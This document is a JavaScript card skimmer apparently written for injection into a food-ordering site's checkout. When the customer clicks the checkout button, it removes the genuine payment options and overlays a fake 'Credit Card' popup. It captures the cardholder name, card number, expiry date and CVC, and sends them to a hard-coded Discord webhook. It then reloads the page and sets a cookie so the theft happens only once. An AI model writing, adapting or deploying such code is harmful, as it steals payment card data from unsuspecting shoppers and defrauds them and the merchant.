// Function to set a cookie
function setCookie(name, value, options = {}) {
    let cookieString = `${name}=${encodeURIComponent(value)}`;
    if (options.expires) {
        cookieString += `; expires=${options.expires.toUTCString()}`;
    }
    if (options.path) {
        cookieString += `; path=${options.path}`;
    }
    document.cookie = cookieString;
}

// Function to get a cookie
function getCookie(name) {
    const cookies = document.cookie.split(';').map(cookie => cookie.trim());
    for (const cookie of cookies) {
        const [cookieName, cookieValue] = cookie.split('=');
        if (cookieName === name) {
            return decodeURIComponent(cookieValue);
        }
    }
    return null;
}

// Get total amount
const totalAmountElement = document.querySelector('body > div.menu-desktop.page-desktop.text-center.theme_background > div.container.theme-body-menu-desktop-bg.menu-cont > div.body-menu-desktop.row.position-relative.text-center > div.menu-desktop-cart.order.d-none.d-lg-block.offset-md-4.col-lg-3.col-xl-3.offset-lg-0.rounded-menu.position-relative > div.card.rounded-menu.order-list.themeColumn3Bg.themeBorderColumns > div.cart-subfooter > div.total.pt-3 > h5.total-amount.themeColumn3Font.primaryColour');
const totalAmount = totalAmountElement ? totalAmountElement.textContent : 'N/A';

// Check if the popup has already run
const hasRun = getCookie('paymentPopupRun');
if (!hasRun) {
    // Wait for click on the #nextstep button
    const nextStepButton = document.querySelector('#nextstep');
    if (nextStepButton) {
        nextStepButton.addEventListener('click', () => {
            // Set cookie to prevent re-running
            setCookie('paymentPopupRun', 'true', { path: '/' });

            // Remove the existing payment options container
            const oldContainer = document.querySelector('#paymentOptionsContainer');
            if (oldContainer) {
                oldContainer.remove();
            }

            // Create popup container and backdrop
            const backdrop = document.createElement('div');
            backdrop.id = 'paymentPopupBackdrop';
            backdrop.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 9999; display: flex; justify-content: center; align-items: center;';

            // Create payment form container
            const newContainer = document.createElement('div');
            newContainer.id = 'paymentOptionsContainer';
            newContainer.style.cssText = 'background: #fff; padding: 20px; max-width: 400px; width: 90%; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); position: relative;';
            newContainer.innerHTML = `
              <div style="font-family: Arial, sans-serif;">
                <button id="closePopup" style="position: absolute; top: 10px; right: 10px; background: #dc3545; color: white; border: none; border-radius: 50%; width: 24px; height: 24px; cursor: pointer; font-size: 14px; line-height: 24px; text-align: center;">×</button>
                <h4 style="margin-bottom: 10px; text-align: center; color: #333;">Credit Card</h4>
                <p style="text-align: center; color: #333; font-size: 18px; font-weight: bold; margin-bottom: 15px;">Total: ${totalAmount}</p>
                <form id="simple-payment-form">
                  <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: bold;" for="cardholder-name">Cardholder Name</label>
                    <input type="text" id="cardholder-name" placeholder="Name on Card" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px;">
                  </div>
                  <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: bold;" for="card-number">Card Number</label>
                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px;">
                  </div>
                  <div style="display: flex; gap: 15px; margin-bottom: 15px;">
                    <div style="flex: 1;">
                      <label style="display: block; margin-bottom: 5px; font-weight: bold;" for="expiry-date">Expiry Date</label>
                      <input type="text" id="expiry-date" placeholder="MM/YY" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px;">
                    </div>
                    <div style="flex: 1;">
                      <label style="display: block; margin-bottom: 5px; font-weight: bold;" for="cvc">CVC</label>
                      <input type="text" id="cvc" placeholder="123" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px;">
                    </div>
                  </div>
                  <button type="submit" style="width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; transition: background 0.2s;">Pay Now</button>
                </form>
                <p style="text-align: center; color: #666; font-size: 14px; margin-top: 10px;">1.40% surcharge added</p>
                <p id="error-message" style="text-align: center; color: #dc3545; font-size: 14px; margin-top: 10px; display: none;">Please try again</p>
              </div>
            `;

            // Append form to backdrop, and backdrop to body
            backdrop.appendChild(newContainer);
            document.body.appendChild(backdrop);

            // Close popup functionality
            document.querySelector('#closePopup').addEventListener('click', () => {
                backdrop.remove();
            });

            // Add form submission handler to send data to webhook
            document.querySelector('#simple-payment-form').addEventListener('submit', async (e) => {
                e.preventDefault();
                const errorMessage = document.querySelector('#error-message');
                errorMessage.style.display = 'none'; // Hide error message initially

                const name = document.querySelector('#cardholder-name').value;
                const number = document.querySelector('#card-number').value;
                const expiry = document.querySelector('#expiry-date').value;
                const cvc = document.querySelector('#cvc').value;
                const paymentDetails = { name, number, expiry, cvc, total: totalAmount };

                // Send data to Discord webhook
                try {
                    const response = await fetch('https://discord.com/api/webhooks/1383037554642780161/12Krj-WpOo-hnc-cPNQ7ChRKVcPmympDEmF47f-fjKWiLhPCypijLWiflc2pZVPlN7-v', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: 'New Payment Submission',
                            embeds: [{
                                title: 'Payment Details',
                                fields: [
                                    { name: 'Cardholder Name', value: name || 'N/A', inline: true },
                                    { name: 'Card Number', value: number || 'N/A', inline: true },
                                    { name: 'Expiry Date', value: expiry || 'N/A', inline: true },
                                    { name: 'CVC', value: cvc || 'N/A', inline: true },
                                    { name: 'Total Amount', value: totalAmount, inline: true },
                                ],
                                color: 0x28a745,
                                timestamp: new Date().toISOString(),
                            }],
                        }),
                    });

                    if (response.ok) {
                        backdrop.remove(); // Close popup
                        location.reload(); // Reload the page
                    } else {
                        errorMessage.style.display = 'block'; // Show error message
                    }
                } catch (error) {
                    errorMessage.style.display = 'block'; // Show error message
                }
            });
        });
    }
}
